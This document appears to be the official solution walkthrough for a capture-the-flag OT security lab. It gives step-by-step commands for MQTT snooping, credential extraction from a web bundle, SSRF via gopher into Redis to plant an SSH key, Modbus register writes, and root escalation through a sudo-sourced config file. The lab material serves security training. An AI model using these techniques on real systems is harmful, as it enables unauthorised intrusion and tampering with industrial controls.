# Volt-Stream: Official Solution Walkthrough

This guide provides the technical solution for the 6-phase attack chain in the Volt-Stream OT Security lab.

---

## Phase 1: MQTT Reconnaissance
The broker is exposed on port 1883 with anonymous read access.

**Action:** Subscribe to all topics to find telemetry data.
```bash
mosquitto_sub -h <TARGET_IP> -t "#" -v
```
**Result:** You will see a JSON payload on `grid/status/public`.
**Flag/Find:** `VulnOS{...}`

---

## Phase 2: JS Credential Leak
The main web app on port 80 contains a credential leak in its minified bundle.

**Action:** Search the JS bundle for "staging" credentials.
```bash
# Find the bundle path
curl -s http://<TARGET_IP>/ | grep -oP '/static/js/main\.[a-z0-9]+\.js'

# Extract the credentials
curl -s http://<TARGET_IP>/static/js/main.<ID>.js | grep -o '_qaEndpoint={[^}]*}'
```
**Result:** 
- **Endpoint:** `http://localhost:31337/hmi-staging`
- **Username:** `hmi_staging_user`
- **Password:** `Stag1ng#HMI_2024`

---

## Phase 3: Pivot via Decoy Panel
Access the "Staging HMI" on port 31337 using the leaked credentials.

**Action:** Login and inspect response headers.
```bash
curl -s -X POST http://<TARGET_IP>:31337/ \
  -d "user=hmi_staging_user&pass=Stag1ng%23HMI_2024" -I
```
**Result:** The header `X-Internal-Gateway` reveals the internal vhost: `grid-control.internal.vulnos`.

---

## Phase 4: Modbus Gateway Access
The internal vhost hosts a Modbus-to-REST bridge.

**Action:** Add the vhost to your `/etc/hosts` and query the registers.
```bash
echo "<TARGET_IP> grid-control.internal.vulnos" | sudo tee -a /etc/hosts
curl -s http://grid-control.internal.vulnos/modbus/read
```
**Result:** Returns the solar inverter's holding registers (0-9).

---

## Phase 5: SSRF to Redis (User Flag)
The endpoint `http://<TARGET_IP>/api/v1/grid-report` is vulnerable to SSRF and supports the `gopher://` protocol.

**Action:** Inject an SSH public key into `gridadmin`'s `authorized_keys` via Redis.

1. **Generate a key:** `ssh-keygen -t ed25519 -f /tmp/volt`
2. **Build Gopher Payload:**
```python
import urllib.parse
key = open('/tmp/volt.pub').read().strip()
# Redis RESP commands to SET a key and BGSAVE
payload = f'*3\r\n$3\r\nSET\r\n$7\r\nssh_key\r\n${len(key)+4}\r\n\n\n{key}\n\n\r\n'
print(urllib.parse.quote(payload))
```
3. **Trigger SSRF:**
```bash
# Inject Key
curl -s -X POST http://<TARGET_IP>/api/v1/grid-report \
  -d '{"grid_id":"A","source":"gopher://127.0.0.1:6379/_<URL_ENCODED_PAYLOAD>"}'

# Trigger Save
curl -s -X POST http://<TARGET_IP>/api/v1/grid-report \
  -d '{"grid_id":"A","source":"gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0ABGSAVE%0D%0A"}'
```
4. **SSH Access:** `ssh -i /tmp/volt gridadmin@<TARGET_IP>`
**Flag 1:** `VulnOS{...}`

---

## Phase 6: Root Escalation (Root Flag)
The `gridadmin` user can trigger `grid_panic.sh` via sudo, which sources the user-controlled `grid.conf` as root.

**Action:** Inject a payload into `grid.conf` and trigger the panic.

1. **Modify Config:**
```bash
echo "cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt" > /home/gridadmin/grid.conf
```
2. **Trigger via SCADA (Optional but realistic):**
Write value `9999` to Modbus register `7` using the REST bridge:
```bash
curl -s -X POST http://grid-control.internal.vulnos/modbus/write \
  -d '{"register": 7, "value": 9999}'
```
3. **Read Flag:**
```bash
cat /tmp/root.txt
```
**Flag 2:** `VulnOS{...}`
